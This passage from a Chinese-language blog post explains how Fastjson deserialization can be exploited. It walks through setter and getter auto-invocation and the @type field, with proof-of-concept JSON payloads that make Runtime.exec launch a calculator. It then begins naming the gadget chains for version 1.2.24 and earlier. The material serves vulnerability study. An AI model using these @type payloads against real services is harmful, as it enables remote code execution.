+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj3</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj3</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>结果</p>
+<pre tabindex="0"><code>调用constructor
+调用setName
+调用setAge
+调用getAge
+调用getName
+serializedStr= {&#34;age&#34;:18,&#34;name&#34;:&#34;ThnPkm&#34;}
+1.parse方法进行反序列化:
+parse反序列化对象名称:com.alibaba.fastjson.JSONObject
+parse反序列化：{&#34;name&#34;:&#34;ThnPkm&#34;,&#34;age&#34;:18}
+2.parseObject不指定类进行反序列化:
+parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
+parseObject反序列化:{&#34;name&#34;:&#34;ThnPkm&#34;,&#34;age&#34;:18}
+3.parseObject指定类进行反序列化:
+调用constructor
+调用setAge
+调用setName
+parseObject反序列化对象名称:fastjson.demo
+parseObject反序列化:fastjson.demo@621be5d1</code></pre><ul>
+<li><code>parse(&quot;&quot;)</code> 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
+<li><code>parseObject(&quot;&quot;)</code>会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li>
+<li><code>parseObject(&quot;&quot;,class)</code> 只调用反序列化得到的类的构造函数、JSON里面的非私有属性的<code>setter</code>方法、properties属性的<code>getter</code>方法；</li>
+</ul>
+<p>其中getter自动调用还需要满足以下条件：</p>
+<ul>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>以get开头且第四个字母为大写</li>
+<li>无参数传入</li>
+<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
+</ul>
+<p>setter自动调用需要满足以下条件：</p>
+<ul>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>返回值为void或者当前类</li>
+<li>以set开头且第四个字母为大写</li>
+<li>参数个数为1个</li>
+</ul>
+<p>除此之外Fastjson还有以下功能点：</p>
+<ol>
+<li>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li>
+<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
+</ol>
+<h2 id="type" class="heading-element"><span>@type</span>
+  <a href="#type" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>@type是个啥？</p>
+<p>@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是一个]ava对象的类型。具体来说，当fastjson从ISON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型</p>
+<blockquote>
+<p>fastjson在1.2.24之后默认禁用Autotype，可以通过Parserconfig.getGlobalInstance().addAccept(&ldquo;java.1ang&rdquo;);来开启，否则会报错autoType is not support.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">fastjson</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.parser.ParserConfig</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.parser.ParserConfig</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">type</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">json</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34; {\&#34;@type\&#34;:\&#34;java.lang.Runtime\&#34;}&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//        ParserConfig.getGlobalInstance().addAccept(&#34;java.lang&#34;);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Runtime</span> <span style="color:#58a1dd">runtime</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">Runtime</span>) <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#58a1dd">json</span>, <span style="color:#58a1dd">Object</span>.<span style="color:#58a1dd">class</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">runtime</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">runtime</span>.<span style="color:#58a1dd">exec</span>(<span style="color:#a6be9d">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031502633.webp" alt="image-20240903150206407" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031502633.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031502633.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031502633.webp?size=large 2x" data-title="image-20240903150206407" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>所以这里出现了一个很敏感的问题，<code>@type</code>为恶意类时，我们可以通过他的get或set方法去进行一些恶意的操作了</p>
+<h2 id="serializerfeaturewriteclassname" class="heading-element"><span>SerializerFeature.WriteClassName</span>
+  <a href="#serializerfeaturewriteclassname" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p><code>SerializerFeature.WriteClassName</code>，是<code>JSON.toJSONString()</code>中的一个设置属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名，type可以指定反序列化的类，并且调用其<code>getter/setter/is</code>方法。 Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作</p>
+</blockquote>
+<ul>
+<li>
+<p>我传入的json什么条件下可以反序列化到我JSON.parseObject里指定的类中？</p>
+<p>答案是我指定的类的属性名和json的key的名字相同，那如果不同呢？也可以通过注解来解决</p>
+<p>比如说我的类里是abage，但是json里是age，在类里加一个注解也可以解决：<code>@JSONField(name = &quot;age&quot;)</code></p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">String</span> <span style="color:#58a1dd">serializedStr</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">toJSONString</span>(<span style="color:#58a1dd">user</span>,<span style="color:#58a1dd">SerializerFeature</span>.<span style="color:#58a1dd">WriteClassName</span>);</span></span></code></pre></div><p>可以和前面运行的结果进行对比，这里执行<code>parse</code>反序列化对象从JSONObject变成了我们自己编写的user类</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">fastjson</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.serializer.SerializerFeature</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">Fastjsontest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">demo</span> <span style="color:#58a1dd">user1</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">demo</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">user1</span>.<span style="color:#58a1dd">setName</span>(<span style="color:#a6be9d">&#34;xxx&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">user1</span>.<span style="color:#58a1dd">setAge</span>(<span style="color:#58a1dd">18</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//序列化</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">serializedStr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">toJSONString</span>(<span style="color:#58a1dd">user1</span>, <span style="color:#58a1dd">SerializerFeature</span>.<span style="color:#58a1dd">WriteClassName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;serializedStr= &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">serializedStr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">//反序列化</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj3</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#58a1dd">serializedStr</span>,<span style="color:#58a1dd">demo</span>.<span style="color:#58a1dd">class</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj3</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;parseObject反序列化:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">obj3</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><pre tabindex="0"><code>调用constructor
+调用setName
+调用setAge
+调用getAge
+调用getName
+serializedStr= {&#34;@type&#34;:&#34;fastjson.demo&#34;,&#34;age&#34;:18,&#34;name&#34;:&#34;xxx&#34;}
+调用constructor
+调用setAge
+调用setName
+parseObject反序列化对象名称:fastjson.demo
+parseObject反序列化:fastjson.demo@497470ed</code></pre><h2 id="featuresupportnonpublicfield反序列化" class="heading-element"><span>Feature.SupportNonPublicField(反序列化)</span>
+  <a href="#featuresupportnonpublicfield%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>把demo里面的setAge注释掉，就不能设置age了，因为原先反序列化的时候都是调用setAge</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">fastjson</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">SupportNonPublicField</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">demo</span> <span style="color:#58a1dd">xiaoming</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#a6be9d">&#34;{\&#34;age\&#34;:20,\&#34;name\&#34;:\&#34;xxx\&#34;}&#34;</span>,<span style="color:#58a1dd">demo</span>.<span style="color:#58a1dd">class</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Name: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xiaoming</span>.<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Age: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xiaoming</span>.<span style="color:#58a1dd">getAge</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>结果</p>
+<pre tabindex="0"><code>调用constructor
+调用setName
+调用getName
+Name: xxx
+调用getAge
+Age: 0</code></pre><p>我们获取到的是 初始化的值 为0</p>
+<p>但是这里我们加上 Feature.SupportNonPublicField 即可获得该私有变量</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">fastjson</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.JSON</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.alibaba.fastjson.parser.Feature</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">SupportNonPublicField</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">demo</span> <span style="color:#58a1dd">xiaoming</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parseObject</span>(<span style="color:#a6be9d">&#34;{\&#34;age\&#34;:20,\&#34;name\&#34;:\&#34;xxx\&#34;}&#34;</span>,<span style="color:#58a1dd">demo</span>.<span style="color:#58a1dd">class</span>, <span style="color:#58a1dd">Feature</span>.<span style="color:#58a1dd">SupportNonPublicField</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Name: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xiaoming</span>.<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Age: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xiaoming</span>.<span style="color:#58a1dd">getAge</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>结果</p>
+<pre tabindex="0"><code>调用constructor
+调用setName
+调用getName
+Name: xxx
+调用getAge
+Age: 20</code></pre><h2 id="parse与parseobject区别" class="heading-element"><span>parse与parseObject区别</span>
+  <a href="#parse%e4%b8%8eparseobject%e5%8c%ba%e5%88%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象</p>
+<p>parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。</p>
+<p>进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p>
+<h2 id="漏洞原理" class="heading-element"><span>漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。</p>
+<p>例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p>
+</blockquote>
+<p>fastjson他反序列化的时候会去找到@type这个指定类的全部属性的seter geter方法来进行自动调用，也就是说如果存在一个可控的指定类，以及这个指定类中存在可控的set get方法，就可以通过这个fastjson去调用set方法去达到任意命令执行</p>
+<p>看如下案例 一个java bean类</p>
+<pre tabindex="0"><code>import java.io.IOException;
+ 
+public class Calc {
+    public String calc;
+ 
+    public Calc() {
+        System.out.println(&#34;调用了构造函数&#34;);
+    }
+ 
+    public String getCalc() {
+        System.out.println(&#34;调用了getter&#34;);
+        return calc;
+    }
+ 
+    public void setCalc(String calc) throws IOException {
+        this.calc = calc;
+        Runtime.getRuntime().exec(&#34;calc&#34;);
+        System.out.println(&#34;调用了setter&#34;);
+    }
+}</code></pre><p>序列化</p>
+<pre tabindex="0"><code>public class SerFJTest {
+    public static void main(String[] args) throws IOException {
+        Calc calc = new Calc();
+        calc.setCalc(&#34;zjacky&#34;);
+        String jsonstring = JSON.toJSONString(calc, SerializerFeature.WriteClassName); //
+        System.out.println(jsonstring);
+    }
+}
+
+//  {&#34;@type&#34;:&#34;fastjson.Calc&#34;,&#34;calc&#34;:&#34;zjacky&#34;}</code></pre><p>反序列化</p>
+<pre tabindex="0"><code>import com.alibaba.fastjson.JSON;
+ 
+public class Fastjson_Test {
+    public static void main(String[] args) {
+        String JSON_Calc = &#34;{\&#34;@type\&#34;:\&#34;Calc\&#34;,\&#34;calc\&#34;:\&#34;Faster\&#34;}&#34;;
+        System.out.println(JSON.parseObject(JSON_Calc));
+    }
+}</code></pre><h2 id="fastjson各版本漏洞分析" class="heading-element"><span>Fastjson各版本漏洞分析</span>
+  <a href="#fastjson%e5%90%84%e7%89%88%e6%9c%ac%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="fastjson1224" class="heading-element"><span>fastjson&lt;=1.2.24</span>
+  <a href="#fastjson1224" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在小于fastjson1.2.22-1.2.24版本中有两条利用链。</p>
+<ol>
+<li>JNDI <code>com.sun.rowset.JdbcRowSetImpl</code></li>
+<li>JDK7u21 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
+</ol>
+<h4 id="templatesimpl链jdk7u21" class="heading-element"><span>TemplatesImpl链(JDK7u21)</span>
+  <a href="#templatesimpl%e9%93%bejdk7u21" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>条件苛刻</p>
+<ol>
+<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</code></li>
+<li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField)</code></li>
+</ol>
+<p>因为payload需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据</p>
+<p>之前分析的TemplateImpl的时候，他利用链的最外层是一个<code>getOutputProperties</code>，但是parse进行自动调用的是setXxxx，那么我们就得想办法去找到一个setXxxx调用</p>
+<p>调用链</p>
